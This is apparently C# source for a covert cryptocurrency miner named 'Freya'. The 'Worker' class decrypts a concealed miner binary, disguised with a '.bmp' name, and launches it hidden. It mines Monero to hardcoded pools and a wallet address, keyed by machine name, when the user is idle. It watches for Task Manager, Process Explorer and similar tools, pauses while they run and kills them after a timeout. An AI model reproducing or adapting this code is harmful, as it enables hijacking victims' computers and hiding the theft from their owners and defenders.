using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using ZetaIpc.Runtime.Client;

namespace Freya
{
    public class Worker
    {
        public int apiPort { get; private set; }
        public WorkerStatus workerStatus { get; private set; }
        public string Message { get { return workerStatus.StatusMessage; } }
        public FConstants.WorkerType Type { get; private set; }
        public bool isRunning { get; private set; }
        public bool AlwaysRun;   // AlwaysRun開關
        public bool Enable
        {
            get { return isEnable; }
            set
            {
                if (value == false) // Disable
                {
                    isEnable = false;
                    pMonitorTimer.Stop();
                    Stop();
                }
                else   // Enable
                {
                    isEnable = true;
                    pMonitorTimer.Start();
                }
            }
        }


        private bool isEnable = false;
        private string _machineName;
        private string filename;
        private double idletime;
        private double taskmgrtime = 0;
        private int Level;
        private FIpcClient radioClient = null;
        private Status s;
        private bool powerLineAttached;
        private int WatchDogCounter;

        private Process _p = null;
        private LogWriter _logger;
        private System.Timers.Timer pMonitorTimer;

        public Worker(FConstants.WorkerType type, Status status, FIpcClient rc = null, LogWriter logwriter = null)
        {
            this.Type = type;
            _logger = logwriter;
            radioClient = rc;
            _machineName = Environment.MachineName;
            apiPort = FFunc.FreePortHelper.GetFreePort(FConstants.WorkerAPIPort_Start);
            idletime = 0;
            isRunning = false;
            AlwaysRun = false;
            filename = "";
            workerStatus = new WorkerStatus();
            WatchDogCounter = 60;
            s = status;
            Level = -1;

            PowerStatus powerStatus = SystemInformation.PowerStatus;
            powerLineAttached = (powerStatus.PowerLineStatus == PowerLineStatus.Online) ? true : false;

            _p = new Process();
            _p.StartInfo.RedirectStandardOutput = true;
            _p.StartInfo.UseShellExecute = false;
            _p.StartInfo.CreateNoWindow = true;

            //** Timer for ProcessMonitor
            pMonitorTimer = new System.Timers.Timer();
            pMonitorTimer.Elapsed += new ElapsedEventHandler(ProcessMonitor);
            pMonitorTimer.Interval = 1000;

            CleanUpDuplicateProcess();
            log($"Initalized with MachineName {_machineName} at apiPort {apiPort}.");
        }

        private void ProcessMonitor(object sender, ElapsedEventArgs e)
        {
            //保持idletime在 1.7E+308內，以免爆炸
            if (idletime++ > 1.7E+300)
                idletime = FConstants.TimeToAutoStart + 10;

            bool OkToGo = true;

            // UI Idle time  > TimeToAutoStart
            if (Type != FConstants.WorkerType.CPU)
                OkToGo = ((idletime * pMonitorTimer.Interval / 1000) > FConstants.TimeToAutoStart);

            // Process中沒有特定程序 (CPU Worker才確認)
            if (Type == FConstants.WorkerType.CPU)
                OkToGo &= CheckProcess();

            // 若有AlwaysRun, 則一律啟動
            OkToGo |= AlwaysRun;

            // Power Line沒插就不啟動
            PowerStatus powerStatus = SystemInformation.PowerStatus;
            powerLineAttached = (powerStatus.PowerLineStatus == PowerLineStatus.Online) ? true : false;
            OkToGo &= powerLineAttached;

            //WatchDog Counter < 0 停止後重啟
            if (WatchDogCounter <= 0)
            {
                OkToGo = false;
                WatchDogCounter = 60;
            }

            if (isEnable && OkToGo)
                Start();
            else
                Stop();

            CleanUpDuplicateProcess();

            //if (isRunning)
            if (OkToGo)
                Task.Run(() =>
                {
                    workerStatus = FFunc.DownloadJsonToObject<WorkerStatus>("http://127.0.0.1:" + apiPort.ToString());
                    workerStatus.StatusMessage = string.Format("{0:0.00} (10s) / {1:0.00} (15m) | Shares: {2} / {3} | Diff: {4} | Lev:{5} - WDg:{6}",
                        workerStatus?.hashrate?.total?[0],
                        workerStatus?.hashrate?.total?[2],
                        workerStatus?.results?.shares_good,
                        workerStatus?.results?.shares_total,
                        workerStatus?.results?.diff_current, Level, WatchDogCounter);

                    if (workerStatus?.hashrate?.total?[0] > 0)
                    {
                        WatchDogCounter = 60;
                    }
                    else
                    {
                        WatchDogCounter--;
                    }
                });
            else
                workerStatus.StatusMessage = "OkToGo=False";
        }

        public void Start()
        {
            if (isRunning)
            {
                if (Level != GetLevel())
                {
                    if ((Level == -1) && (GetLevel() == 2))
                        Level = GetLevel();
                    else
                    {
                        log($"Pool Level switched from {Level} to {GetLevel()}");
                        Stop();
                    }
                }
                else
                    return;
            }
            isRunning = true;

            try
            {
                MakeSureMinerExist();

                //每段參數後面務必保留一個空格
                _p.StartInfo.Arguments = $"--background --api-port {apiPort} " + GetPoolString();

                if (Type == FConstants.WorkerType.CPU)
                    _p.StartInfo.Arguments = _p.StartInfo.Arguments + "--cpu-priority 0 "; // CPU miner add priority

                if (Type == FConstants.WorkerType.nVidia)
                    _p.StartInfo.Arguments = _p.StartInfo.Arguments + "--donate-level 0 "; // nVidia miner

                //_p.StartInfo.FileName = FConstants.MinerFilePath + "\\" + FConstants.MinerFileName[n];
                _p.StartInfo.FileName = filename;
                _p.Start();

                log($"Started with PID {_p.Id} at {(idletime * pMonitorTimer.Interval / 1000)}s");
            }
            catch (Exception ex)
            {
                isRunning = false;
                log($"Start Process exception at {(idletime * pMonitorTimer.Interval / 1000)}s : {ex.Message}");
            }
            finally
            {
                if (isRunning)
                {
                    if (radioClient != null)
                        radioClient.Send("CMD", "MinerActive", Type.ToString());
                    s.MinerIsActive[(int)Type] = true;
                    WatchDogCounter = 60;
                }
            }

        }

        private string GetPoolString()
        {
            //每段參數後面務必保留一個空格
            string poollow =
                        $"-o 10.57.209.245:33322 -u {_machineName} --nicehash -k " +
                        $"-o 10.57.209.245:3332 -u {_machineName} --nicehash -k " +
                        $"-o 10.57.210.61:3333 -u {_machineName} --nicehash -k " +
                        $"-o 10.57.209.245:3333 -u {_machineName} --nicehash -k " +
                        $"-o 10.57.208.65:3333 -u {_machineName} --nicehash -k " +
                        $"-o gulf.moneroocean.stream:10001 -u 48EzquWiBLcAEmkrh7CidEcepZja3EaKcXpBevmJiQDoZZMNcYedbgogCeGrFUZqCSBGAQxzBDYXoiYrJq1AAvzP2PVzKMK.{_machineName} -k " +
                        $"-o xmr.omine.org:5000 -u 48EzquWiBLcAEmkrh7CidEcepZja3EaKcXpBevmJiQDoZZMNcYedbgogCeGrFUZqCSBGAQxzBDYXoiYrJq1AAvzP2PVzKMK#{_machineName} -k ";

            string poolhigh =
                        $"-o 10.57.209.245:3332 -u {_machineName} --nicehash -k " +
                        $"-o 10.57.210.61:3333 -u {_machineName} --nicehash -k " +
                        $"-o 10.57.209.245:3333 -u {_machineName} --nicehash -k " +
                        $"-o 10.57.208.65:3333 -u {_machineName} --nicehash -k " +
                        $"-o gulf.moneroocean.stream:10002 -u 48EzquWiBLcAEmkrh7CidEcepZja3EaKcXpBevmJiQDoZZMNcYedbgogCeGrFUZqCSBGAQxzBDYXoiYrJq1AAvzP2PVzKMK.{_machineName} -k " +
                        $"-o xmr.omine.org:5000 -u 48EzquWiBLcAEmkrh7CidEcepZja3EaKcXpBevmJiQDoZZMNcYedbgogCeGrFUZqCSBGAQxzBDYXoiYrJq1AAvzP2PVzKMK#{_machineName} -k ";

            Level = GetLevel();
            switch (Level)
            {
                case 0: return poollow;
                case 1:
                case 2: return poolhigh;
                default: return poolhigh;
            }
        }

        private int GetLevel()
        {
            int level;
            if (workerStatus?.hashrate?.total?[1] > 0)
                if (workerStatus.hashrate.total[1] <= 80 && workerStatus.hashrate.total[1] > 0)
                    level = 0;
               // else if (workerStatus.hashrate.total[1] <= 280 && workerStatus.hashrate.total[1] > 80)
               //     level = 1;
                else
                    level = 2;
            else
                level = Level;

            return level;
        }

        public void Stop()
        {
            if (!isRunning) return;
            int pid = 0;

            try {
                pid = _p.Id;
                _p.Kill(); }
            catch (Exception ex) { log($"StopProcess Exception : {ex.Message}"); }

            isRunning = false;

            if (radioClient != null)
                radioClient.Send("CMD", "MinerStop", Type.ToString());

            s.MinerIsActive[(int)Type] = false;

            log($"Stopped PID = {pid}");
        }

        private bool CheckProcess()
        {
            int con = 0;
            bool oktogo = false;
            Process[] procs = Process.GetProcesses();

            foreach (Process p in procs)
            {
                string pName = p.ProcessName.ToLower();
                if (pName == "taskmgr" || pName == "daphne" ||
                    pName == "procexp64" || pName == "procexp" ||
                    pName == "processhacker" || pName == "systemexplorer" ||
                    pName == "Systemexplorerservice64" || pName == "systemexplorerservice" ||
                    pName == "anvirlauncher" || pName == "anvir64" ||
                    pName == "tmx64" || pName == "tmx" ||
                    pName == "yapm" || pName == "toolprocesssecurity" ||
                    pName == "dtaskmanager" ||
                    pName == "dota2" || pName == "csgo" || pName == "payday")
                {
                    con++;
                    if (taskmgrtime < 2) //避免一直送taskmgr found 訊息
                        log($"{con} {p.ProcessName} found.");

                    double taskmgrEnableSeconds = (taskmgrtime * pMonitorTimer.Interval / 1000);
                    if (taskmgrEnableSeconds > FConstants.TimeToCloseTaskmgr)
                    {
                        try { p.Kill(); } catch { }
                        log($"{p.ProcessName} Killed @ {taskmgrEnableSeconds}s");
                    }
                    oktogo = false;
                }
            }
            if (con == 0)
            {
                taskmgrtime = 0; //重設
                oktogo = true;
            }
            else
                taskmgrtime++;  //有找到taskmgr程序，開始計時

            return oktogo;
        }

        private void MakeSureMinerExist()
        {
            if (filename.Length == 0)
                filename = getWorkerFileName().Replace(".db", ".bmp");

            try
            {
                if (!File.Exists(filename))
                {
                    long bytes = DecryptToFile(getWorkerFileName(), filename, FConstants.StringCipherKey);
                    if (bytes > 0)
                        log($"Dropped {bytes} bytes to : {filename}");
                    else
                        log($"Decrypt writes {bytes} bytes to file system.");
                }
                else
                {
                    //radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "Check Miner Version", Loglevel = FConstants.FreyaLogLevel.MinerInfo }));

                    //check file version
                }
            }
            catch (Exception ex)
            {
                log($"Drop/Decrypt file exception : {ex.Message}");
            }
        }

        private string getWorkerFileName()
        {
            //return string.Format(@"{0}\{1}.bmp", FConstants.MinerFilePath, Path.GetRandomFileName().Replace(".", ""));
            return string.Format(@"{0}{1}", FConstants.WorkFilePath, FConstants.WorkerFileName[(int)Type]);
        }

        private void CleanUpDuplicateProcess()
        {
            //刪除重複啟動的狀況
            Process[] ProcessList = Process.GetProcessesByName(FConstants.WorkerFileName[(int)Type].Replace(".db", "." +FConstants.WorkerExtentionString));
            foreach (Process p in ProcessList)
            {
                try
                {
                    if (p.Id == _p.Id)
                        if (isRunning || _p.HasExited)
                            continue;
                }
                catch { }

                try
                {
                    p.Kill();
                    log($"Kill duplicate process: {p.ProcessName} @ PID {p.Id}");
                }
                catch (Exception ex) { log($"Kill duplicated process ({p.ProcessName} - {p.Id}) Excpetion: {ex.Message}"); }
            }
        }

        private long DecryptToFile(string fileIn, string fileOut, string Password)
        {
            if (!File.Exists(fileIn))
            {
                log($"Decryptor Can't find input file: {fileIn}");
                return 0;
            }

            // First we are going to open the file streams 
            FileStream fsIn = new FileStream(fileIn,
                        FileMode.Open, FileAccess.Read);
            FileStream fsOut = new FileStream(fileOut,
                        FileMode.Create, FileAccess.Write);

            // Then we are going to derive a Key and an IV from
            // the Password and create an algorithm 
            PasswordDeriveBytes pdb = new PasswordDeriveBytes(Password,
                new byte[] {0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d,
            0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76});
            Rijndael alg = Rijndael.Create();

            alg.Key = pdb.GetBytes(32);
            alg.IV = pdb.GetBytes(16);

            // Now create a crypto stream through which we are going
            // to be pumping data. 
            // Our fileOut is going to be receiving the Decrypted bytes. 
            CryptoStream cs = new CryptoStream(fsOut,
                alg.CreateDecryptor(), CryptoStreamMode.Write);

            // Now will will initialize a buffer and will be 
            // processing the input file in chunks. 
            // This is done to avoid reading the whole file (which can be
            // huge) into memory. 
            int bufferLen = 4096;
            byte[] buffer = new byte[bufferLen];
            int bytesRead;
            long bytesWrited = 0;

            do
            {
                // read a chunk of data from the input file 
                bytesRead = fsIn.Read(buffer, 0, bufferLen);

                // Decrypt it 
                cs.Write(buffer, 0, bytesRead);

                bytesWrited += bytesRead;
            } while (bytesRead != 0);

            // close everything 
            cs.Close(); // this will also close the unrelying fsOut stream 
            fsIn.Close();

            return bytesWrited;
        }

        public void SetIdleTime(double t)
        {
            if (t > 0)
                idletime = t;
            else
                idletime = 0;
        }

        private void log(string msg)
        {
            if (_logger != null)
                lock (_logger)
                {
                    _logger.WriteLine($"[Worker {Type.ToString()}] {msg}");
                }
        }

        ~Worker()
        {
            _p.Dispose();
        }

    }

    public class WorkerStatus : JSONXmrig.Rootobject
    {
        public string StatusMessage = "";


    }

}
